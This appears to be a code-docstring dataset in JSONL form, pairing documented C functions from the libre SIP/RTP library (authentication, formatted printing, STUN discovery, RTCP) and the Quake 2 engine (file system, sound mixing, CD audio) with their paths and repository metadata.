{"docstring": "/**\n * Allocate a SIP authentication state\n *\n * @param authp Pointer to allocated SIP authentication state\n * @param authh Authentication handler\n * @param arg   Handler argument\n * @param ref   True to mem_ref() argument\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int sip_auth_alloc(struct sip_auth **authp, sip_auth_h *authh,\n\t\t   void *arg, bool ref)", "code": "{\n\tstruct sip_auth *auth;\n\n\tif (!authp)\n\t\treturn EINVAL;\n\n\tauth = mem_zalloc(sizeof(*auth), auth_destructor);\n\tif (!auth)\n\t\treturn ENOMEM;\n\n\tauth->authh = authh ? authh : dummy_handler;\n\tauth->arg   = ref ? mem_ref(arg) : arg;\n\tauth->ref   = ref;\n\n\t*authp = auth;\n\n\treturn 0;\n}", "path": "src\\sip\\auth.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Print a formatted string\n *\n * @param fmt Formatted string\n * @param ap  Variable argument\n * @param vph Print handler\n * @param arg Handler argument\n *\n * @return 0 if success, otherwise errorcode\n *\n * Extensions:\n *\n * <pre>\n *   %b  (char *, size_t)        Buffer string with pointer and length\n *   %r  (struct pl)             Pointer-length object\n *   %w  (uint8_t *, size_t)     Binary buffer to hexadecimal format\n *   %j  (struct sa *)           Socket address - address part only\n *   %J  (struct sa *)           Socket address and port - like 1.2.3.4:1234\n *   %H  (re_printf_h *, void *) Print handler with argument\n *   %v  (char *fmt, va_list *)  Variable argument list\n *   %m  (int)                   Describe an error code\n * </pre>\n *\n * Reserved for the future:\n *\n *   %k\n *   %y\n *\n */\n", "func_signal": "int re_vhprintf(const char *fmt, va_list ap, re_vprintf_h *vph, void *arg)", "code": "{\n\tuint8_t base, *bptr;\n\tchar pch, ch, num[NUM_SIZE], addr[64], msg[256];\n\tenum length_modifier lenmod = LENMOD_NONE;\n\tstruct re_printf pf;\n\tbool fm = false, plr = false;\n\tconst struct pl *pl;\n\tsize_t pad = 0, fpad = -1, len, i;\n\tconst char *str, *p = fmt, *p0 = fmt;\n\tconst struct sa *sa;\n\tre_printf_h *ph;\n\tvoid *ph_arg;\n\tva_list *apl;\n\tint err = 0;\n\tvoid *ptr;\n\tuint64_t n;\n\tint64_t sn;\n\tbool uc = false;\n\tdouble dbl;\n\n\tif (!fmt || !vph)\n\t\treturn EINVAL;\n\n\tpf.vph = vph;\n\tpf.arg = arg;\n\n\tfor (;*p && !err; p++) {\n\n\t\tif (!fm) {\n\t\t\tif (*p != '%')\n\t\t\t\tcontinue;\n\n\t\t\tpch = ' ';\n\t\t\tplr = false;\n\t\t\tpad = 0;\n\t\t\tfpad = -1;\n\t\t\tlenmod = LENMOD_NONE;\n\t\t\tuc = false;\n\n\t\t\tif (p > p0)\n\t\t\t\terr |= vph(p0, p - p0, arg);\n\n\t\t\tfm = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\tfm = false;\n\t\tbase = 10;\n\n\t\tswitch (*p) {\n\n\t\tcase '-':\n\t\t\tplr = true;\n\t\t\tfm  = true;\n\t\t\tbreak;\n\n\t\tcase '.':\n\t\t\tfpad = pad;\n\t\t\tpad = 0;\n\t\t\tfm = true;\n\t\t\tbreak;\n\n\t\tcase '%':\n\t\t\tch = '%';\n\n\t\t\terr |= vph(&ch, 1, arg);\n\t\t\tbreak;\n\n\t\tcase 'b':\n\t\t\tstr = va_arg(ap, const char *);\n\t\t\tlen = va_arg(ap, size_t);\n\n\t\t\terr |= write_padded(str, str ? len : 0, pad, ' ',\n\t\t\t\t\t    plr, NULL, vph, arg);\n\t\t\tbreak;\n\n\t\tcase 'c':\n\t\t\tch = va_arg(ap, int);\n\n\t\t\terr |= write_padded(&ch, 1, pad, ' ', plr, NULL,\n\t\t\t\t\t    vph, arg);\n\t\t\tbreak;\n\n\t\tcase 'd':\n\t\tcase 'i':\n\t\t\tswitch (lenmod) {\n\n\t\t\tcase LENMOD_SIZE:\n\t\t\t\tsn = va_arg(ap, ssize_t);\n\t\t\t\tbreak;\n\n\t\t\tdefault:\n\t\t\tcase LENMOD_LONG_LONG:\n\t\t\t\tsn = va_arg(ap, signed long long);\n\t\t\t\tbreak;\n\n\t\t\tcase LENMOD_LONG:\n\t\t\t\tsn = va_arg(ap, signed long);\n\t\t\t\tbreak;\n\n\t\t\tcase LENMOD_NONE:\n\t\t\t\tsn = va_arg(ap, signed);\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tlen = local_itoa(num, (sn < 0) ? -sn : sn, base,\n\t\t\t\t\t false);\n\n\t\t\terr |= write_padded(num, len, pad,\n\t\t\t\t\t    plr ? ' ' : pch, plr,\n\t\t\t\t\t    (sn < 0) ? prfx_neg : NULL,\n\t\t\t\t\t    vph, arg);\n\t\t\tbreak;\n\n\t\tcase 'f':\n\t\tcase 'F':\n\t\t\tdbl = va_arg(ap, double);\n\n\t\t\tif (fpad == (size_t)-1) {\n\t\t\t\tfpad = pad;\n\t\t\t\tpad  = 0;\n\t\t\t}\n\n\t\t\tif (isinf(dbl)) {\n\t\t\t\terr |= write_padded(\"inf\", 3, fpad,\n\t\t\t\t\t\t    ' ', plr, NULL, vph, arg);\n\t\t\t}\n\t\t\telse if (isnan(dbl)) {\n\t\t\t\terr |= write_padded(\"nan\", 3, fpad,\n\t\t\t\t\t\t    ' ', plr, NULL, vph, arg);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tlen = local_ftoa(num, dbl,\n\t\t\t\t\t\t pad ? min(pad, DEC_SIZE) : 6);\n\n\t\t\t\terr |= write_padded(num, len, fpad,\n\t\t\t\t\t\t    plr ? ' ' : pch, plr,\n\t\t\t\t\t\t    (dbl<0) ? prfx_neg : NULL,\n\t\t\t\t\t\t    vph, arg);\n\t\t\t}\n\t\t\tbreak;\n\n\t\tcase 'H':\n\t\t\tph     = va_arg(ap, re_printf_h *);\n\t\t\tph_arg = va_arg(ap, void *);\n\n\t\t\tif (ph)\n\t\t\t\terr |= ph(&pf, ph_arg);\n\t\t\tbreak;\n\n\t\tcase 'l':\n\t\t\t++lenmod;\n\t\t\tfm = true;\n\t\t\tbreak;\n\n\t\tcase 'm':\n\t\t\tstr = str_error(va_arg(ap, int), msg, sizeof(msg));\n\t\t\terr |= write_padded(str, str_len(str), pad,\n\t\t\t\t\t    ' ', plr, NULL, vph, arg);\n\t\t\tbreak;\n\n\t\tcase 'p':\n\t\t\tptr = va_arg(ap, void *);\n\n\t\t\tif (ptr) {\n\t\t\t\tlen = local_itoa(num, (unsigned long int)ptr,\n\t\t\t\t\t\t 16, false);\n\t\t\t\terr |= write_padded(num, len, pad,\n\t\t\t\t\t\t    plr ? ' ' : pch, plr,\n\t\t\t\t\t\t    prfx_hex, vph, arg);\n\t\t\t}\n\t\t\telse {\n\t\t\t\terr |= write_padded(str_nil,\n\t\t\t\t\t\t    sizeof(str_nil) - 1,\n\t\t\t\t\t\t    pad, ' ', plr, NULL,\n\t\t\t\t\t\t    vph, arg);\n\t\t\t}\n\t\t\tbreak;\n\n\t\tcase 'r':\n\t\t\tpl = va_arg(ap, const struct pl *);\n\n\t\t\terr |= write_padded(pl ? pl->p : NULL,\n\t\t\t\t\t    (pl && pl->p) ? pl->l : 0,\n\t\t\t\t\t    pad, ' ', plr, NULL, vph, arg);\n\t\t\tbreak;\n\n\t\tcase 's':\n\t\t\tstr = va_arg(ap, const char *);\n\t\t\terr |= write_padded(str, str_len(str), pad,\n\t\t\t\t\t    ' ', plr, NULL, vph, arg);\n\t\t\tbreak;\n\n\t\tcase 'X':\n\t\t\tuc = true;\n\t\t\t/*@fallthrough@*/\n\t\tcase 'x':\n\t\t\tbase = 16;\n\t\t\t/*@fallthrough@*/\n\t\tcase 'u':\n\t\t\tswitch (lenmod) {\n\n\t\t\tcase LENMOD_SIZE:\n\t\t\t\tn = va_arg(ap, size_t);\n\t\t\t\tbreak;\n\n\t\t\tdefault:\n\t\t\tcase LENMOD_LONG_LONG:\n\t\t\t\tn = va_arg(ap, unsigned long long);\n\t\t\t\tbreak;\n\n\t\t\tcase LENMOD_LONG:\n\t\t\t\tn = va_arg(ap, unsigned long);\n\t\t\t\tbreak;\n\n\t\t\tcase LENMOD_NONE:\n\t\t\t\tn = va_arg(ap, unsigned);\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tlen = local_itoa(num, n, base, uc);\n\n\t\t\terr |= write_padded(num, len, pad,\n\t\t\t\t\t    plr ? ' ' : pch, plr, NULL,\n\t\t\t\t\t    vph, arg);\n\t\t\tbreak;\n\n\t\tcase 'v':\n\t\t\tstr = va_arg(ap, char *);\n\t\t\tapl = va_arg(ap, va_list *);\n\n\t\t\tif (!str || !apl)\n\t\t\t\tbreak;\n\n\t\t\terr |= re_vhprintf(str, *apl, vph, arg);\n\t\t\tbreak;\n\n\t\tcase 'W':\n\t\t\tuc = true;\n\t\t\t/*@fallthrough@*/\n\t\tcase 'w':\n\t\t\tbptr = va_arg(ap, uint8_t *);\n\t\t\tlen = va_arg(ap, size_t);\n\n\t\t\tlen = bptr ? len : 0;\n\t\t\tpch = plr ? ' ' : pch;\n\n\t\t\twhile (!plr && pad-- > (len * 2))\n\t\t\t\terr |= vph(&pch, 1, arg);\n\n\t\t\tfor (i=0; i<len; i++) {\n\t\t\t\tconst uint8_t v = *bptr++;\n\t\t\t\tuint32_t l = local_itoa(num, v, 16, uc);\n\t\t\t\terr |= write_padded(num, l, 2, '0',\n\t\t\t\t\t\t    false, NULL, vph, arg);\n\t\t\t}\n\n\t\t\twhile (plr && pad-- > (len * 2))\n\t\t\t\terr |= vph(&pch, 1, arg);\n\n\t\t\tbreak;\n\n\t\tcase 'z':\n\t\t\tlenmod = LENMOD_SIZE;\n\t\t\tfm = true;\n\t\t\tbreak;\n\n\t\tcase 'j':\n\t\t\tsa = va_arg(ap, struct sa *);\n\t\t\tif (!sa)\n\t\t\t\tbreak;\n\t\t\tif (sa_ntop(sa, addr, sizeof(addr))) {\n\t\t\t\terr |= write_padded(\"?\", 1, pad, ' ',\n\t\t\t\t\t\t    plr, NULL, vph, arg);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\terr |= write_padded(addr, strlen(addr), pad, ' ',\n\t\t\t\t\t    plr, NULL, vph, arg);\n\t\t\tbreak;\n\n\n\t\tcase 'J':\n\t\t\tsa = va_arg(ap, struct sa *);\n\t\t\tif (!sa)\n\t\t\t\tbreak;\n\t\t\tif (sa_ntop(sa, addr, sizeof(addr))) {\n\t\t\t\terr |= write_padded(\"?\", 1, pad, ' ',\n\t\t\t\t\t\t    plr, NULL, vph, arg);\n\t\t\t\tbreak;\n\t\t\t}\n\n#ifdef HAVE_INET6\n\t\t\tif (AF_INET6 == sa_af(sa)) {\n\t\t\t\tch = '[';\n\t\t\t\terr |= vph(&ch, 1, arg);\n\t\t\t}\n#endif\n\t\t\terr |= write_padded(addr, strlen(addr), pad, ' ',\n\t\t\t\t\t    plr, NULL, vph, arg);\n#ifdef HAVE_INET6\n\t\t\tif (AF_INET6 == sa_af(sa)) {\n\t\t\t\tch = ']';\n\t\t\t\terr |= vph(&ch, 1, arg);\n\t\t\t}\n#endif\n\n\t\t\tch = ':';\n\t\t\terr |= vph(&ch, 1, arg);\n\t\t\tlen = local_itoa(num, sa_port(sa), 10, false);\n\t\t\terr |= write_padded(num, len, pad,\n\t\t\t\t\t    plr ? ' ' : pch, plr, NULL,\n\t\t\t\t\t    vph, arg);\n\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tif (('0' <= *p) && (*p <= '9')) {\n\t\t\t\tif (!pad && ('0' == *p)) {\n\t\t\t\t\tpch = '0';\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tpad *= 10;\n\t\t\t\t\tpad += *p - '0';\n\t\t\t\t}\n\t\t\t\tfm = true;\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tch = '?';\n\n\t\t\terr |= vph(&ch, 1, arg);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (!fm)\n\t\t\tp0 = p + 1;\n\t}\n\n\tif (!fm && p > p0)\n\t\terr |= vph(p0, p - p0, arg);\n\n\treturn err;\n}", "path": "src\\fmt\\print.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/** Gather Server Reflexive address */\n", "func_signal": "static int send_binding_request(struct icem *icem, struct icem_comp *comp)", "code": "{\n\tint err;\n\n\tif (comp->ct_gath)\n\t\treturn EALREADY;\n\n\terr = stun_request(&comp->ct_gath, icem->stun, icem->proto,\n\t\t\t   comp->sock, &icem->stun_srv, 0,\n\t\t\t   STUN_METHOD_BINDING,\n\t\t\t   NULL, false, 0,\n\t\t\t   stun_resp_handler, comp, 1,\n\t\t\t   STUN_ATTR_SOFTWARE, stun_software);\n\tif (err)\n\t\treturn err;\n\n\t++icem->nstun;\n\n\treturn 0;\n}", "path": "src\\ice\\gather.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Reset a SIP authentication state\n *\n * @param auth SIP Authentication state\n */\n", "func_signal": "void sip_auth_reset(struct sip_auth *auth)", "code": "{\n\tif (!auth)\n\t\treturn;\n\n\tlist_flush(&auth->realml);\n}", "path": "src\\sip\\auth.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Send an RTCP Picture Loss Indication (PLI) packet\n *\n * @param rs      RTP Socket\n * @param fb_ssrc Feedback SSRC\n *\n * @return 0 for success, otherwise errorcode\n */\n", "func_signal": "int rtcp_send_pli(struct rtp_sock *rs, uint32_t fb_ssrc)", "code": "{\n\treturn rtcp_quick_send(rs, RTCP_PSFB, RTCP_PSFB_PLI,\n\t\t\t       rtp_sess_ssrc(rs), fb_ssrc, NULL, NULL);\n}", "path": "src\\rtp\\rtcp.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Print a formatted string to a buffer, using va_list\n *\n * @param str  Buffer for output string\n * @param size Size of buffer\n * @param fmt  Formatted string\n * @param ap   Variable-arguments list\n *\n * @return The number of characters printed, or -1 if error\n */\n", "func_signal": "int re_vsnprintf(char *str, size_t size, const char *fmt, va_list ap)", "code": "{\n\tstruct pl pl;\n\tint err;\n\n\tif (!str || !size)\n\t\treturn -1;\n\n\tpl.p = str;\n\tpl.l = size - 1;\n\n\terr = re_vhprintf(fmt, ap, print_handler, &pl);\n\n\tstr[size - pl.l - 1] = '\\0';\n\n\treturn err ? -1 : (int)(size - pl.l - 1);\n}", "path": "src\\fmt\\print.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Get a list of all network interfaces including name and IP address.\n * Both IPv4 and IPv6 are supported\n *\n * @param ifh Interface handler, called once per network interface\n * @param arg Handler argument\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int net_if_apply(net_ifaddr_h *ifh, void *arg)", "code": "{\n#ifdef HAVE_GETIFADDRS\n\treturn net_getifaddrs(ifh, arg);\n#else\n\treturn net_if_list(ifh, arg);\n#endif\n}", "path": "src\\net\\net.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Print a formatted string to a file stream\n *\n * @param stream File stream for output\n * @param fmt    Formatted string\n *\n * @return The number of characters printed, or -1 if error\n */\n", "func_signal": "int re_fprintf(FILE *stream, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\tint n;\n\n\tva_start(ap, fmt);\n\tn = re_vfprintf(stream, fmt, ap);\n\tva_end(ap);\n\n\treturn n;\n}", "path": "src\\fmt\\print.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Print a formatted string\n *\n * @param pf  Print backend\n * @param fmt Formatted string\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int re_hprintf(struct re_printf *pf, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\tint err;\n\n\tif (!pf)\n\t\treturn EINVAL;\n\n\tva_start(ap, fmt);\n\terr = re_vhprintf(fmt, ap, pf->vph, pf->arg);\n\tva_end(ap);\n\n\treturn err;\n}", "path": "src\\fmt\\print.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Print a formatted string to a dynamically allocated buffer, using va_list\n *\n * @param strp Pointer for output string\n * @param fmt  Formatted string\n * @param ap   Variable-arguments list\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int re_vsdprintf(char **strp, const char *fmt, va_list ap)", "code": "{\n\tstruct dyn_print dp;\n\tint err;\n\n\tif (!strp)\n\t\treturn EINVAL;\n\n\tdp.size = 16;\n\tdp.str  = mem_alloc(dp.size, NULL);\n\tif (!dp.str)\n\t\treturn ENOMEM;\n\n\tdp.p = dp.str;\n\tdp.l = dp.size;\n\n\terr = re_vhprintf(fmt, ap, print_handler_dyn, &dp);\n\tif (err)\n\t\tgoto out;\n\n\t*dp.p = '\\0';\n\n out:\n\tif (err)\n\t\tmem_deref(dp.str);\n\telse\n\t\t*strp = dp.str;\n\n\treturn err;\n}", "path": "src\\fmt\\print.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Do a DNS Discovery of a STUN Server\n *\n * @param dnsp    Pointer to allocated DNS Discovery object\n * @param dnsc    DNS Client\n * @param service Name of service to discover (e.g. \"stun\")\n * @param proto   Transport protocol (e.g. \"udp\")\n * @param af      Preferred Address Family\n * @param domain  Domain name or IP address of STUN server\n * @param port    Port number (if 0 do SRV lookup)\n * @param dnsh    DNS Response handler\n * @param arg     Handler argument\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int stun_server_discover(struct stun_dns **dnsp, struct dnsc *dnsc,\n\t\t\t const char *service, const char *proto,\n\t\t\t int af, const char *domain, uint16_t port,\n\t\t\t stun_dns_h *dnsh, void *arg)", "code": "{\n\tstruct stun_dns *dns;\n\tint err;\n\n\tif (!dnsp || !service || !proto || !domain || !domain[0] || !dnsh)\n\t\treturn EINVAL;\n\n\tdns = mem_zalloc(sizeof(*dns), dnsdisc_destructor);\n\tif (!dns)\n\t\treturn ENOMEM;\n\n\tdns->port = service[strlen(service)-1] == 's' ? STUNS_PORT : STUN_PORT;\n\tdns->dnsh = dnsh;\n\tdns->arg  = arg;\n\tdns->dnsc = dnsc;\n\tdns->af   = af;\n\n\t/* Numeric IP address - no lookup */\n\tif (0 == sa_set_str(&dns->srv, domain, port ? port : dns->port)) {\n\n\t\tDEBUG_INFO(\"IP (%s)\\n\", domain);\n\n\t\tresolved(dns, 0);\n\t\terr = 0;\n\t\tgoto out; /* free now */\n\t}\n\t/* Port specified - use AAAA or A lookup */\n\telse if (port) {\n\t\tsa_set_in(&dns->srv, 0, port);\n\t\tDEBUG_INFO(\"resolving A query: (%s)\\n\", domain);\n\n\t\terr = a_or_aaaa_query(dns, domain);\n\t\tif (err) {\n\t\t\tDEBUG_WARNING(\"%s: A/AAAA lookup failed (%m)\\n\",\n\t\t\t\t      domain, err);\n\t\t\tgoto out;\n\t\t}\n\t}\n\t/* SRV lookup */\n\telse {\n\t\tchar q[256];\n\t\tstr_ncpy(dns->domain, domain, sizeof(dns->domain));\n\t\t(void)re_snprintf(q, sizeof(q), \"_%s._%s.%s\", service, proto,\n\t\t\t\t  domain);\n\t\tDEBUG_INFO(\"resolving SRV query: (%s)\\n\", q);\n\t\terr = dnsc_query(&dns->dq, dnsc, q, DNS_TYPE_SRV, DNS_CLASS_IN,\n\t\t\t\t true, srv_handler, dns);\n\t\tif (err) {\n\t\t\tDEBUG_WARNING(\"%s: SRV lookup failed (%m)\\n\", q, err);\n\t\t\tgoto out;\n\t\t}\n\t}\n\n\t*dnsp = dns;\n\n\treturn 0;\n\n out:\n\tmem_deref(dns);\n\treturn err;\n}", "path": "src\\stun\\dnsdisc.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/**\n * Get the IP address of the host\n *\n * @param af  Address Family\n * @param ip  Returned IP address\n *\n * @return 0 if success, otherwise errorcode\n */\n", "func_signal": "int net_hostaddr(int af, struct sa *ip)", "code": "{\n\tchar hostname[256];\n\tstruct in_addr in;\n\tstruct hostent *he;\n\n\tif (-1 == gethostname(hostname, sizeof(hostname)))\n\t\treturn errno;\n\n\the = gethostbyname(hostname);\n\tif (!he)\n\t\treturn ENOENT;\n\n\tif (af != he->h_addrtype)\n\t\treturn EAFNOSUPPORT;\n\n\t/* Get the first entry */\n\tmemcpy(&in, he->h_addr_list[0], sizeof(in));\n\tsa_set_in(ip, ntohl(in.s_addr), 0);\n\n\treturn 0;\n}", "path": "src\\net\\net.c", "repo_name": "muromec/libre", "stars": 38, "license": "None", "language": "c", "size": 472}
{"docstring": "/*\n============\nFS_Gamedir\n\nCalled to find where to write a file (demos, savegames, etc)\n============\n*/\n", "func_signal": "char *FS_Gamedir (void)", "code": "{\n\tif (*fs_gamedir)\n\t\treturn fs_gamedir;\n\telse\n\t\treturn BASEDIRNAME;\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n============\nS_RawSamples\n\nCinematic streaming and voice over network\n============\n*/\n", "func_signal": "void S_RawSamples (int samples, int rate, int width, int channels, byte *data)", "code": "{\n\tint\t\ti;\n\tint\t\tsrc, dst;\n\tfloat\tscale;\n\n\tif (!sound_started)\n\t\treturn;\n\n\tif (s_rawend < paintedtime)\n\t\ts_rawend = paintedtime;\n\tscale = (float)rate / dma.speed;\n\n//Com_Printf (\"%i < %i < %i\\n\", soundtime, paintedtime, s_rawend);\n\tif (channels == 2 && width == 2)\n\t{\n\t\tif (scale == 1.0)\n\t\t{\t// optimized case\n\t\t\tfor (i=0 ; i<samples ; i++)\n\t\t\t{\n\t\t\t\tdst = s_rawend&(MAX_RAW_SAMPLES-1);\n\t\t\t\ts_rawend++;\n\t\t\t\ts_rawsamples[dst].left =\n\t\t\t\t    LittleShort(((short *)data)[i*2]) << 8;\n\t\t\t\ts_rawsamples[dst].right =\n\t\t\t\t    LittleShort(((short *)data)[i*2+1]) << 8;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor (i=0 ; ; i++)\n\t\t\t{\n\t\t\t\tsrc = i*scale;\n\t\t\t\tif (src >= samples)\n\t\t\t\t\tbreak;\n\t\t\t\tdst = s_rawend&(MAX_RAW_SAMPLES-1);\n\t\t\t\ts_rawend++;\n\t\t\t\ts_rawsamples[dst].left =\n\t\t\t\t    LittleShort(((short *)data)[src*2]) << 8;\n\t\t\t\ts_rawsamples[dst].right =\n\t\t\t\t    LittleShort(((short *)data)[src*2+1]) << 8;\n\t\t\t}\n\t\t}\n\t}\n\telse if (channels == 1 && width == 2)\n\t{\n\t\tfor (i=0 ; ; i++)\n\t\t{\n\t\t\tsrc = i*scale;\n\t\t\tif (src >= samples)\n\t\t\t\tbreak;\n\t\t\tdst = s_rawend&(MAX_RAW_SAMPLES-1);\n\t\t\ts_rawend++;\n\t\t\ts_rawsamples[dst].left =\n\t\t\t    LittleShort(((short *)data)[src]) << 8;\n\t\t\ts_rawsamples[dst].right =\n\t\t\t    LittleShort(((short *)data)[src]) << 8;\n\t\t}\n\t}\n\telse if (channels == 2 && width == 1)\n\t{\n\t\tfor (i=0 ; ; i++)\n\t\t{\n\t\t\tsrc = i*scale;\n\t\t\tif (src >= samples)\n\t\t\t\tbreak;\n\t\t\tdst = s_rawend&(MAX_RAW_SAMPLES-1);\n\t\t\ts_rawend++;\n\t\t\ts_rawsamples[dst].left =\n\t\t\t    ((char *)data)[src*2] << 16;\n\t\t\ts_rawsamples[dst].right =\n\t\t\t    ((char *)data)[src*2+1] << 16;\n\t\t}\n\t}\n\telse if (channels == 1 && width == 1)\n\t{\n\t\tfor (i=0 ; ; i++)\n\t\t{\n\t\t\tsrc = i*scale;\n\t\t\tif (src >= samples)\n\t\t\t\tbreak;\n\t\t\tdst = s_rawend&(MAX_RAW_SAMPLES-1);\n\t\t\ts_rawend++;\n\t\t\ts_rawsamples[dst].left =\n\t\t\t    (((byte *)data)[src]-128) << 16;\n\t\t\ts_rawsamples[dst].right = (((byte *)data)[src]-128) << 16;\n\t\t}\n\t}\n}", "path": "client\\snd_dma.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n===========\nCDAudio_Activate\n\nCalled when the main window gains or loses focus.\nThe window have been destroyed and recreated\nbetween a deactivate and an activate.\n===========\n*/\n", "func_signal": "void CDAudio_Activate (qboolean active)", "code": "{\n\tif (active)\n\t\tCDAudio_Resume ();\n\telse\n\t\tCDAudio_Pause ();\n}", "path": "win32\\cd_win.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "// this is just for demos to prevent add on hacking\n", "func_signal": "int FS_FOpenFile (char *filename, FILE **file)", "code": "{\n\tsearchpath_t\t*search;\n\tchar\t\t\tnetpath[MAX_OSPATH];\n\tpack_t\t\t\t*pak;\n\tint\t\t\t\ti;\n\n\tfile_from_pak = 0;\n\n\t// get config from directory, everything else from pak\n\tif (!strcmp(filename, \"config.cfg\") || !strncmp(filename, \"players/\", 8))\n\t{\n\t\tCom_sprintf (netpath, sizeof(netpath), \"%s/%s\",FS_Gamedir(), filename);\n\t\t\n\t\t*file = fopen (netpath, \"rb\");\n\t\tif (!*file)\n\t\t\treturn -1;\n\t\t\n\t\tCom_DPrintf (\"FindFile: %s\\n\",netpath);\n\n\t\treturn FS_filelength (*file);\n\t}\n\n\tfor (search = fs_searchpaths ; search ; search = search->next)\n\t\tif (search->pack)\n\t\t\tbreak;\n\tif (!search)\n\t{\n\t\t*file = NULL;\n\t\treturn -1;\n\t}\n\n\tpak = search->pack;\n\tfor (i=0 ; i<pak->numfiles ; i++)\n\t\tif (!Q_strcasecmp (pak->files[i].name, filename))\n\t\t{\t// found it!\n\t\t\tfile_from_pak = 1;\n\t\t\tCom_DPrintf (\"PackFile: %s : %s\\n\",pak->filename, filename);\n\t\t// open a new file on the pakfile\n\t\t\t*file = fopen (pak->filename, \"rb\");\n\t\t\tif (!*file)\n\t\t\t\tCom_Error (ERR_FATAL, \"Couldn't reopen %s\", pak->filename);\t\n\t\t\tfseek (*file, pak->files[i].filepos, SEEK_SET);\n\t\t\treturn pak->files[i].filelen;\n\t\t}\n\t\n\tCom_DPrintf (\"FindFile: can't find %s\\n\", filename);\n\t\n\t*file = NULL;\n\treturn -1;\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n==================\nS_StopAllSounds\n==================\n*/\n", "func_signal": "void S_StopAllSounds(void)", "code": "{\n\tint\t\ti;\n\n\tif (!sound_started)\n\t\treturn;\n\n\t// clear all the playsounds\n\tmemset(s_playsounds, 0, sizeof(s_playsounds));\n\ts_freeplays.next = s_freeplays.prev = &s_freeplays;\n\ts_pendingplays.next = s_pendingplays.prev = &s_pendingplays;\n\n\tfor (i=0 ; i<MAX_PLAYSOUNDS ; i++)\n\t{\n\t\ts_playsounds[i].prev = &s_freeplays;\n\t\ts_playsounds[i].next = s_freeplays.next;\n\t\ts_playsounds[i].prev->next = &s_playsounds[i];\n\t\ts_playsounds[i].next->prev = &s_playsounds[i];\n\t}\n\n\t// clear all the channels\n\tmemset(channels, 0, sizeof(channels));\n\n\tS_ClearBuffer ();\n}", "path": "client\\snd_dma.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n================\nFS_SetGamedir\n\nSets the gamedir and path to a different directory.\n================\n*/\n", "func_signal": "void FS_SetGamedir (char *dir)", "code": "{\n\tsearchpath_t\t*next;\n\n\tif (strstr(dir, \"..\") || strstr(dir, \"/\")\n\t\t|| strstr(dir, \"\\\\\") || strstr(dir, \":\") )\n\t{\n\t\tCom_Printf (\"Gamedir should be a single filename, not a path\\n\");\n\t\treturn;\n\t}\n\n\t//\n\t// free up any current game dir info\n\t//\n\twhile (fs_searchpaths != fs_base_searchpaths)\n\t{\n\t\tif (fs_searchpaths->pack)\n\t\t{\n\t\t\tfclose (fs_searchpaths->pack->handle);\n\t\t\tZ_Free (fs_searchpaths->pack->files);\n\t\t\tZ_Free (fs_searchpaths->pack);\n\t\t}\n\t\tnext = fs_searchpaths->next;\n\t\tZ_Free (fs_searchpaths);\n\t\tfs_searchpaths = next;\n\t}\n\n\t//\n\t// flush all data, so it will be forced to reload\n\t//\n\tif (dedicated && !dedicated->value)\n\t\tCbuf_AddText (\"vid_restart\\nsnd_restart\\n\");\n\n\tCom_sprintf (fs_gamedir, sizeof(fs_gamedir), \"%s/%s\", fs_basedir->string, dir);\n\n\tif (!strcmp(dir,BASEDIRNAME) || (*dir == 0))\n\t{\n\t\tCvar_FullSet (\"gamedir\", \"\", CVAR_SERVERINFO|CVAR_NOSET);\n\t\tCvar_FullSet (\"game\", \"\", CVAR_LATCH|CVAR_SERVERINFO);\n\t}\n\telse\n\t{\n\t\tCvar_FullSet (\"gamedir\", dir, CVAR_SERVERINFO|CVAR_NOSET);\n\t\tif (fs_cddir->string[0])\n\t\t\tFS_AddGameDirectory (va(\"%s/%s\", fs_cddir->string, dir) );\n\t\tFS_AddGameDirectory (va(\"%s/%s\", fs_basedir->string, dir) );\n\t}\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
